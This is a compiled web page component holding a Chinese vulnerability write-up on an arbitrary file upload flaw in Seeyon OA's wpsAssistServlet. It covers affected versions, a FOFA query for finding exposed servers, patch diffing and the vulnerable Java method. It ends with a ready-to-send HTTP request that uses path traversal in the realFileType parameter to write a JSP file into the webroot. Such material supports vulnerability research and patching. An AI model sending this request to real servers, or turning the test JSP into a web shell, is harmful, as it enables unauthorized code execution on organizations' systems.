import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const t={},s=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1)
致远OA G6、G6N (V8.1、V8.1SP1)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;致远互联-OA&quot; &amp;&amp; title=&quot;V8.0SP2&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>产品主页</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241427877.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>下载补丁220706-S004 ，对比修改的文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241427361.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>主要修改的是 <code>com.seeyon.ctp.common.wpsassist.manager.WpsAssistManagerImpl.oaSaveFile</code> 这个方法</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>private Map&lt;String, Object&gt; oaSaveFile(HttpServletRequest request, Map&lt;String, Object&gt; param) throws Exception {
        Map&lt;String, Object&gt; result = Maps.newHashMap();
        result.put(BusinessKey.OfficeTransResultFlag.getCode(), (Object)null);
        Long fileId = MapUtils.getLong(param, &quot;fileId&quot;);
        log.info(&quot;wpsAssist SaveFile start!fileId=&quot; + fileId);
        String newPdfFileId = MapUtils.getString(param, &quot;newPdfFileId&quot;);
        if (Strings.isNotBlank(newPdfFileId)) {
            fileId = Long.valueOf(newPdfFileId);
        }

        String realFileType = MapUtils.getString(param, &quot;realFileType&quot;);
        String tempFileIdPathSuffix = SystemEnvironment.getSystemTempFolder() + File.separator + fileId + realFileType;
        Long count = this.saveFileToPath(request, tempFileIdPathSuffix);
        result.put(BusinessKey.FileSize.getCode(), count);
        result.putAll(this.createOfficeTransCacheFile(fileId, tempFileIdPathSuffix, MapUtils.getString(param, &quot;canTransFileType&quot;)));
        param.put(BusinessKey.OfficeTransResultFlag.getCode(), result.get(BusinessKey.OfficeTransResultFlag.getCode()));
        this.copyToUploadAndTrans(param);
        return result;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>向上追溯调用的 oaSaveFile方法的代码</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241427516.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241428101.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在 <code>com.seeyon.ctp.common.wpsassist.WpsAssistServlet.doPost</code> 中，flag参数为save时，可以调用文件上传接口</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241428602.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><code>C://Seeyon/A6/base/temporary</code> 为默认上传的位置，但 <code>realFileType, fileId</code> 参数可控，可以通过 ../ 遍历上传到任意目录下，验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /seeyon/wpsAssistServlet?flag=save&amp;realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&amp;fileId=2 HTTP/1.1
Host: 
Content-Length: 349
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;123.xls&quot;
Content-Type: application/vnd.ms-excel

&lt;% out.println(&quot;seeyon_vuln&quot;);%&gt;
--59229605f98b8cf290a7b8908b34616b--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241428763.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241428999.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,22),l=[s];function d(r,o){return i(),a("div",null,l)}const u=e(t,[["render",d],["__file","致远OA wpsAssistServlet 任意文件上传漏洞.html.vue"]]);export{u as default};
